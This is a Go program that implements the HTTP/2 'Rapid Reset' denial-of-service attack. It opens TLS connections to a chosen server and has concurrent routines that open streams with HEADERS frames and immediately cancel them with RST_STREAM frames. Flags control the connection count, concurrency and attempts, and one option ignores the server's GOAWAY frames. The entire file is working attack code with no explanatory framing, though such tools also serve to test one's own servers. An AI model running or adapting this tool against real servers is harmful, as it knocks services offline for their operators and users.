package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"log"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

type ReadFrameResult struct {
	Headers      uint32
	GoAway       uint32
	Data         uint32
	Settings     uint32
	WindowUpdate uint32
	Ping         uint32
	Unknown      uint32
	RSTStream    uint32
}

var attempts = flag.Uint("attempts", 1, "maximum attempts per routine")
var sleep = flag.Int("delay", 1, "delay between sending HEADERS and RST_STREAM frames")
var ignoreGoAway = flag.Bool("ignoreGoAway", false, "ignore GOAWAY frames sent by the server")
var serverUrl = flag.String("url", "https://localhost:443/", "the server to attack")
var skipVerify = flag.Bool("skipValidation", true, "skip certificate verifcation")
var routines = flag.Int("routines", 1, "number of concurrent streams to attack")
var connections = flag.Int("connections", 1, "number of connections to open")

func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
	var headerBlock bytes.Buffer

	// Encode headers
	encoder := hpack.NewEncoder(&headerBlock)

	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: url.Path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: url.Host})

	return http2.HeadersFrameParam{
		StreamID:      streamId,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	}
}

func main() {
	flag.Parse()
	serverUrl, err := url.Parse(*serverUrl)
	if err != nil {
		log.Fatalf("invalid server url: %v", err)
	}

	conf := &tls.Config{
		InsecureSkipVerify: *skipVerify,
		NextProtos:         []string{"h2"},
	}

	var wg sync.WaitGroup
	for i := 0; i < *connections; i++ {
		wg.Add(1)
		go execute(serverUrl, conf, &wg)
	}
	wg.Wait()
}

func execute(serverUrl *url.URL, conf *tls.Config, wg *sync.WaitGroup) {
	defer wg.Done()

	conn, err := tls.Dial("tcp", serverUrl.Host, conf)
	if err != nil {
		log.Fatalf("error establishing connection to %s: %v", serverUrl.Host, err)
	}

	log.Printf("established connection to %v", serverUrl)

	prefaceBytes := []byte(PREFACE)
	length, err := conn.Write(prefaceBytes)
	if err != nil || length != len(prefaceBytes) {
		log.Fatalf("error sending HTTP2 preface data. Sent %d bytes of %d: %v", length, len(prefaceBytes), err)
	}
	log.Printf("wrote HTTP2 preface")

	framer := http2.NewFramer(conn, conn)
	err = framer.WriteSettings()
	if err != nil {
		log.Fatalf("failed writing SETTINGS frame: %v (%v)", err, framer.ErrorDetail())
	}

	for {
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Fatalf("failed reading frame: %v (%v)", err, framer.ErrorDetail())
		}

		if frame.Header().Type == http2.FrameSettings && frame.Header().Flags == http2.FlagSettingsAck {
			log.Println("received server SETTINGS ACK frame, continuing...")
			break
		}

		log.Printf("received unexpected frame: %v (Flags: %d). Expected SETTINGS ACK.", frame.Header().Type, frame.Header().Flags)
	}

	//at this point, the connection is established.

	var streamCounter atomic.Uint32 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
	streamCounter.Add(1)
	for i := 0; i < *routines; i++ {
		streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
		go attack(streamFramer, serverUrl, *attempts, &streamCounter, sleep)
	}
	readFrames(conn)
	conn.Close()

}

func readFrames(conn *tls.Conn) ReadFrameResult {
	framer := http2.NewFramer(conn, conn) //a framer is fairly lightweight and we don't want to interfere with write operations, so let's read frames on a separate one.
	var rfr ReadFrameResult

	readDuration := time.Duration(10) * time.Second
	for {
		conn.SetReadDeadline(time.Now().Add(readDuration))
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Printf("error reading response frame: %v", err)
			return rfr
		}
		log.Printf("found new frame headers: %v", frame.Header())

		switch frame.Header().Type {
			case http2.FrameHeaders:
				rfr.Headers++
			case http2.FrameSettings:
				rfr.Settings++
			case http2.FrameData:
				rfr.Data++
			case http2.FrameGoAway:
				rfr.GoAway++
				if *ignoreGoAway {
					return rfr
				}
			case http2.FramePing:
				rfr.Ping++
			case http2.FrameRSTStream:
				rfr.RSTStream++
			case http2.FrameWindowUpdate:
				rfr.WindowUpdate++
			default:
				rfr.Unknown++
		}
	}
}

func attack(framer *http2.Framer, url *url.URL, attempts uint, streamCounter *atomic.Uint32, sleepTime *int) {
	for i := uint(0); i < attempts; i++ {
		streamId := streamCounter.Load()
		streamCounter.Add(2)
		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
		if err != nil {
			log.Fatalf("unable to send initial HEADERS frame")
		}
		log.Printf("sent initial headers on stream %d", streamId)

		log.Printf("now sleeping for %d milliseconds", *sleepTime)
		time.Sleep(time.Millisecond * time.Duration(*sleepTime))

		err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
		if err != nil {
			log.Fatalf("unable to write RST_STREAM frame: %v", err)
		}
		log.Print("Wrote RST_STREAM frame")
	}
}
